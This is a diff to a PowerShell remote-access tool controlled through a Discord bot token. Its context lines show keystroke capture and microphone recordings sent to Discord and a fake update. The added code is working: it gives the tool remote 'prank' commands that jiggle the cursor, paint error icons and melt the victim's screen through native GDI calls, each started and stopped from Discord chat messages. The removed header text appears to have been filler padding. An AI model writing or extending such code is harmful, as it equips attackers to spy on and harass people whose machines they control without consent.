@@ -1,4 +1,3 @@
-
 # =====================================================================================================================================================
 <#
 **SETUP**
@@ -13,20 +12,7 @@
 -SETUP THE SCRIPT
 1. Copy the token into the script directly below.
 
-**INFORMATION**
-- The Discord bot you use must be in one server ONLY
 
-USELESS PADDING
-The Get-Content cmdlet gets the content of the item at the location specified by the path, such as the text in a file or the content of a function. For files, the content is read one line at a time and returns a collection of objects, each representing a line of content.
-Beginning in PowerShell 3.0, Get-Content can also get a specified number of lines from the beginning or end of an item.
-The Get-Content cmdlet gets the content of the item at the location specified by the path, such as the text in a file or the content of a function. For files, the content is read one line at a time and returns a collection of objects, each representing a line of content.
-Beginning in PowerShell 3.0, Get-Content can also get a specified number of lines from the beginning or end of an item.
-The Set-PSDebug cmdlet turns script debugging features on and off, sets the trace level, and toggles strict mode. By default, the PowerShell debug features are off.
-When the Trace parameter has a value of 1, each line of script is traced as it runs. When the parameter has a value of 2, variable assignments, function calls, and script calls are also traced. If the Step parameter is specified, you're prompted before each line of the script runs.
-Examples
-Example 1: Get the content of a text file
-
-This example gets the content of a file in the current directory. The LineNumbers.txt file has 100 lines in the format, This is Line X and is used in several examples.
 -------------------------------------------------------------------------------------------------
 #>
 # =====================================================================================================================================================
@@ -319,6 +305,13 @@ $script:jsonPayload = @{
 - **Wallpaper**: Set the wallpaper (wallpaper -url http://img.com/f4wc)
 - **Goose**: Spawn an annoying goose (Sam Pearson App)
 - **ScreenParty**: Start A Disco on screen!
+- **MouseJiggle**: Start Mouse Jiggler
+- **MouseJiggleOff**: Stop Mouse Jiggler
+- **MouseError**: Spawn error icons at the mouse
+- **MouseErrorOff**: Stop spawning error icons at the mouse
+- **ScreenMelt**: Start melting the screen
+- **ScreenMeltOff**: Stop melting the screen
+
 
 ### JOBS
 - **Microphone**: Record microphone clips and send to Discord
@@ -463,6 +456,354 @@ Function NearbyWifi {
 }
 
 # --------------------------------------------------------------- PRANK FUNCTIONS ------------------------------------------------------------------------
+
+
+$mouseblock = {
+
+
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+
+public class Mouse {
+    [DllImport("user32.dll")]
+    public static extern bool GetCursorPos(out POINT lpPoint);
+
+    [DllImport("user32.dll")]
+    public static extern bool SetCursorPos(int X, int Y);
+
+    public struct POINT {
+        public int X;
+        public int Y;
+    }
+}
+"@
+
+    # --- Settings ---
+    $jitterRange = 3          # max wobble from anchor in pixels
+    $delayMs = 30             # loop speed
+    $userMoveThreshold = 4    # if cursor moved this much from our last output, treat as real user movement
+    
+    # --- State ---
+    $p = New-Object Mouse+POINT
+    [Mouse]::GetCursorPos([ref]$p) | Out-Null
+    
+    $anchorX = $p.X
+    $anchorY = $p.Y
+    
+    $lastSetX = $p.X
+    $lastSetY = $p.Y
+    
+    while ($true) {
+        $p = New-Object Mouse+POINT
+        [Mouse]::GetCursorPos([ref]$p) | Out-Null
+    
+        $currentX = $p.X
+        $currentY = $p.Y
+    
+        # Detect likely real user movement:
+        # if current cursor position differs enough from the last position we set,
+        # assume the user moved the mouse and update the anchor
+        $dxFromLastSet = $currentX - $lastSetX
+        $dyFromLastSet = $currentY - $lastSetY
+        $distFromLastSet = [Math]::Sqrt(($dxFromLastSet * $dxFromLastSet) + ($dyFromLastSet * $dyFromLastSet))
+    
+        if ($distFromLastSet -gt $userMoveThreshold) {
+            $anchorX = $currentX
+            $anchorY = $currentY
+        }
+    
+        # Random jitter around the anchor, not around the already-jittered cursor
+        $jx = Get-Random -Minimum (-$jitterRange) -Maximum ($jitterRange + 1)
+        $jy = Get-Random -Minimum (-$jitterRange) -Maximum ($jitterRange + 1)
+    
+        $targetX = $anchorX + $jx
+        $targetY = $anchorY + $jy
+    
+        [Mouse]::SetCursorPos($targetX, $targetY)
+    
+        $lastSetX = $targetX
+        $lastSetY = $targetY
+    
+        Start-Sleep -Milliseconds $delayMs
+    }
+
+
+
+}
+
+
+$screenmelt = {
+Add-Type -AssemblyName System.Windows.Forms
+
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+
+public static class NativeMethods {
+    [DllImport("user32.dll", SetLastError = true)]
+    public static extern IntPtr GetDC(IntPtr hWnd);
+
+    [DllImport("gdi32.dll", SetLastError = true)]
+    public static extern IntPtr CreateCompatibleDC(IntPtr hdc);
+
+    [DllImport("gdi32.dll", SetLastError = true)]
+    public static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
+
+    [DllImport("gdi32.dll", SetLastError = true)]
+    public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);
+
+    [DllImport("gdi32.dll", SetLastError = true)]
+    public static extern bool BitBlt(
+        IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight,
+        IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop
+    );
+
+    [DllImport("gdi32.dll", SetLastError = true)]
+    public static extern bool StretchBlt(
+        IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest,
+        IntPtr hdcSrc, int xSrc, int ySrc, int wSrc, int hSrc,
+        uint rop
+    );
+
+    [DllImport("user32.dll")]
+    public static extern short GetAsyncKeyState(int vKey);
+
+    [DllImport("gdi32.dll", SetLastError = true)]
+    public static extern bool DeleteDC(IntPtr hdc);
+
+    [DllImport("gdi32.dll", SetLastError = true)]
+    public static extern bool DeleteObject(IntPtr hObject);
+
+    [DllImport("user32.dll", SetLastError = true)]
+    public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
+
+    public const uint SRCCOPY = 0x00CC0020;
+}
+"@
+
+$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+$width  = $screen.Width
+$height = $screen.Height
+$left   = $screen.Left
+$top    = $screen.Top
+
+$desktopDC = [IntPtr]::Zero
+$srcDC     = [IntPtr]::Zero
+$workDC    = [IntPtr]::Zero
+$srcBmp    = [IntPtr]::Zero
+$workBmp   = [IntPtr]::Zero
+$srcOld    = [IntPtr]::Zero
+$workOld   = [IntPtr]::Zero
+
+
+try {
+    $desktopDC = [NativeMethods]::GetDC([IntPtr]::Zero)
+
+    $srcDC   = [NativeMethods]::CreateCompatibleDC($desktopDC)
+    $workDC  = [NativeMethods]::CreateCompatibleDC($desktopDC)
+    $srcBmp  = [NativeMethods]::CreateCompatibleBitmap($desktopDC, $width, $height)
+    $workBmp = [NativeMethods]::CreateCompatibleBitmap($desktopDC, $width, $height)
+
+    $srcOld  = [NativeMethods]::SelectObject($srcDC,  $srcBmp)
+    $workOld = [NativeMethods]::SelectObject($workDC, $workBmp)
+
+    # Initial desktop capture
+    [void][NativeMethods]::BitBlt(
+        $srcDC, 0, 0, $width, $height,
+        $desktopDC, $left, $top, [NativeMethods]::SRCCOPY
+    )
+
+    $strips = New-Object System.Collections.Generic.List[object]
+    $x = 0
+    while ($x -lt $width) {
+        $stripWidth = Get-Random -Minimum 1 -Maximum 4
+        if ($x + $stripWidth -gt $width) { $stripWidth = $width - $x }
+
+        $strips.Add([pscustomobject]@{
+            X          = $x
+            Width      = $stripWidth
+            OffsetY    = [double](Get-Random -Minimum -1 -Maximum 1)
+            Speed      = (Get-Random -Minimum 0.06 -Maximum 0.09)
+            Accel      = (Get-Random -Minimum 0.003 -Maximum 0.008)
+            Sway       = (Get-Random -Minimum 2.0 -Maximum 14.0)
+            Phase      = (Get-Random -Minimum 0.0 -Maximum 6.28318)
+            PhaseRate  = (Get-Random -Minimum 0.04 -Maximum 0.20)
+            MeltBias   = (Get-Random -Minimum 0.78 -Maximum 0.98)
+            Split      = Get-Random -Minimum 1 -Maximum 7
+            RippleAmp  = (Get-Random -Minimum 0.0 -Maximum 4.0)
+        })
+
+        $x += $stripWidth
+    }
+
+    $frame = 0
+    $heatFrames = 90
+
+    Write-Host "Liquefy effect running. Press Esc to stop."
+
+    while ($true) {
+
+        # Work buffer starts from source buffer each frame
+        [void][NativeMethods]::BitBlt(
+            $workDC, 0, 0, $width, $height,
+            $srcDC, 0, 0, [NativeMethods]::SRCCOPY
+        )
+
+        $globalRipple = [Math]::Sin($frame * 0.10) * 6.0
+
+        foreach ($s in $strips) {
+            $s.Speed += $s.Accel
+            if ($s.Speed -gt 6) { $s.Speed = 6 }
+
+            if ((Get-Random -Minimum 0 -Maximum 1000) -lt 2) {
+                $s.Speed += Get-Random -Minimum 0.05 -Maximum 0.2
+            }
+
+            $s.OffsetY += $s.Speed
+            $s.Phase += $s.PhaseRate
+
+            if ($s.OffsetY -gt ($height + 120)) {
+                $s.OffsetY   = Get-Random -Minimum -0.1 -Maximum -0.2
+                $s.Speed     = Get-Random -Minimum 0.6 -Maximum 2.4
+                $s.Accel     = Get-Random -Minimum 0.03 -Maximum 0.18
+                $s.Sway      = Get-Random -Minimum 2.0 -Maximum 14.0
+                $s.Phase     = Get-Random -Minimum 0.0 -Maximum 6.28318
+                $s.PhaseRate = Get-Random -Minimum 0.04 -Maximum 0.20
+                $s.MeltBias  = Get-Random -Minimum 0.78 -Maximum 0.98
+                $s.Split     = Get-Random -Minimum 1 -Maximum 7
+                $s.RippleAmp = Get-Random -Minimum 0.0 -Maximum 4.0
+            }
+
+            $heatRamp = 1.0
+            if ($frame -lt $heatFrames) {
+                $heatRamp = $frame / [double]$heatFrames
+            }
+
+            $rippleX = [Math]::Sin(($s.X * 0.04) + ($frame * 0.18) + $s.Phase) * ($s.RippleAmp + $globalRipple) * $heatRamp
+            $sagX    = [Math]::Sin($s.Phase) * $s.Sway
+            $destX   = [int]($s.X + $rippleX + $sagX)
+            $destY   = [int]$s.OffsetY
+
+            if ($destY -lt 0) { $destY = 0 }
+            if ($destY -ge $height) { continue }
+
+            $destW = [int][Math]::Max(1, $s.Width)
+            if ($destX -lt 0) { $destX = 0 }
+            if ($destX + $destW -gt $width) { $destW = $width - $destX }
+            if ($destW -le 0) { continue }
+
+            $destH = $height - $destY
+            if ($destH -le 0) { continue }
+
+            $srcH = [int][Math]::Max(8, $height * $s.MeltBias)
+
+            # main melt body
+            [void][NativeMethods]::StretchBlt(
+                $workDC,
+                $destX, $destY, $destW, $destH,
+                $srcDC,
+                $s.X, 0, $s.Width, $srcH,
+                [NativeMethods]::SRCCOPY
+            )
+
+            # RGB-ish split by drawing slight offset copies
+            $split = [int]$s.Split
+            [void][NativeMethods]::StretchBlt(
+                $workDC,
+                $destX - $split, $destY, $destW, $destH,
+                $srcDC,
+                $s.X, 0, $s.Width, [int]($srcH * 0.99),
+                [NativeMethods]::SRCCOPY
+            )
+
+            [void][NativeMethods]::StretchBlt(
+                $workDC,
+                $destX + $split, $destY + 1, $destW, $destH,
+                $srcDC,
+                $s.X, 0, $s.Width, [int]($srcH * 0.97),
+                [NativeMethods]::SRCCOPY
+            )
+
+            # top smear
+            if ($destY -gt 3) {
+                $smearH = [Math]::Min(10, $destH)
+                [void][NativeMethods]::StretchBlt(
+                    $workDC,
+                    $destX, $destY - $smearH, $destW, $smearH,
+                    $srcDC,
+                    $s.X, 0, $s.Width, [Math]::Max(2, [int]($smearH * 0.4)),
+                    [NativeMethods]::SRCCOPY
+                )
+            }
+        }
+
+        # Draw work buffer to screen
+        [void][NativeMethods]::BitBlt(
+            $desktopDC, $left, $top, $width, $height,
+            $workDC, 0, 0, [NativeMethods]::SRCCOPY
+        )
+
+        # Recursive self-melt: periodically recapture the distorted result
+        if (($frame % 3) -eq 0) {
+            [void][NativeMethods]::BitBlt(
+                $srcDC, 0, 0, $width, $height,
+                $desktopDC, $left, $top, [NativeMethods]::SRCCOPY
+            )
+        }
+
+        $frame++
+        Start-Sleep -Milliseconds 18
+    }
+}
+finally {
+    if ($srcDC -ne [IntPtr]::Zero -and $srcOld -ne [IntPtr]::Zero) {
+        [void][NativeMethods]::SelectObject($srcDC, $srcOld)
+    }
+    if ($workDC -ne [IntPtr]::Zero -and $workOld -ne [IntPtr]::Zero) {
+        [void][NativeMethods]::SelectObject($workDC, $workOld)
+    }
+    if ($srcBmp -ne [IntPtr]::Zero) {
+        [void][NativeMethods]::DeleteObject($srcBmp)
+    }
+    if ($workBmp -ne [IntPtr]::Zero) {
+        [void][NativeMethods]::DeleteObject($workBmp)
+    }
+    if ($srcDC -ne [IntPtr]::Zero) {
+        [void][NativeMethods]::DeleteDC($srcDC)
+    }
+    if ($workDC -ne [IntPtr]::Zero) {
+        [void][NativeMethods]::DeleteDC($workDC)
+    }
+    if ($desktopDC -ne [IntPtr]::Zero) {
+        [void][NativeMethods]::ReleaseDC([IntPtr]::Zero, $desktopDC)
+    }
+}
+
+}
+
+
+# Paint error icons wherever the mouse is located
+$errorIcons = {
+    Add-Type -AssemblyName System.Drawing
+    Add-Type -AssemblyName System.Windows.Forms  
+    $desktopHandle = [System.IntPtr]::Zero
+    $graphics = [System.Drawing.Graphics]::FromHwnd($desktopHandle)
+    $icon = [System.Drawing.Icon]::ExtractAssociatedIcon("C:\Windows\System32\DFDWiz.exe")  
+    function Get-MousePosition {
+        $point = [System.Windows.Forms.Cursor]::Position
+        return $point
+    }   
+    while ($true) {
+        $mousePosition = Get-MousePosition
+        $graphics.DrawIcon($icon, $mousePosition.X, $mousePosition.Y)
+        Start-Sleep -Milliseconds 50
+    }
+    $graphics.Clear([System.Drawing.Color]::Transparent)
+    $graphics.Dispose()
+    $icon.Dispose()
+}
+
 
 Function FakeUpdate {
     $tobat = @'
@@ -1598,6 +1939,9 @@ param([string]$token,[string]$PowershellID)
     }
 }
 
+
+
+
 # Scriptblock for keycapture to discord
 $doKeyjob = {
 param([string]$token,[string]$keyID)
@@ -1975,6 +2319,33 @@ while ($true) {
             }
             else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
         }
+        if ($messages -eq 'mousejiggle'){
+            Start-Job -ScriptBlock $mouseblock -Name MouseJiggle
+            sendMsg -Message ":white_check_mark: ``Mouse Jiggle : ON`` :white_check_mark:"
+        }
+        if ($messages -eq 'mousejiggleoff'){
+            Stop-Job -Name MouseJiggle
+            Remove-Job -Name MouseJiggle
+            sendMsg -Message ":no_entry: ``Mouse Jiggle : OFF`` :no_entry:"
+        }
+        if ($messages -eq 'mouseerror'){
+            Start-Job -ScriptBlock $errorIcons -Name MouseError
+            sendMsg -Message ":white_check_mark: ``Mouse Error : ON`` :white_check_mark:"
+        }
+        if ($messages -eq 'mouseerroroff'){
+            Stop-Job -Name MouseError
+            Remove-Job -Name MouseError
+            sendMsg -Message ":no_entry: ``Mouse Error : OFF`` :no_entry:"
+        }
+        if ($messages -eq 'screenmelt'){
+            Start-Job -ScriptBlock $screenmelt -Name Melt
+            sendMsg -Message ":white_check_mark: ``Screen Melt : ON`` :white_check_mark:"
+        }
+        if ($messages -eq 'screenmeltoff'){
+            Stop-Job -Name Melt
+            Remove-Job -Name Melt
+            sendMsg -Message ":no_entry: ``Screen Melt : OFF`` :no_entry:"
+        }
         if ($messages -eq 'pausejobs'){
             Stop-Job -Name Audio
             Stop-Job -Name Screen
@@ -2025,6 +2396,7 @@ while ($true) {
     }
     Sleep 3
 }
+
 
 
 
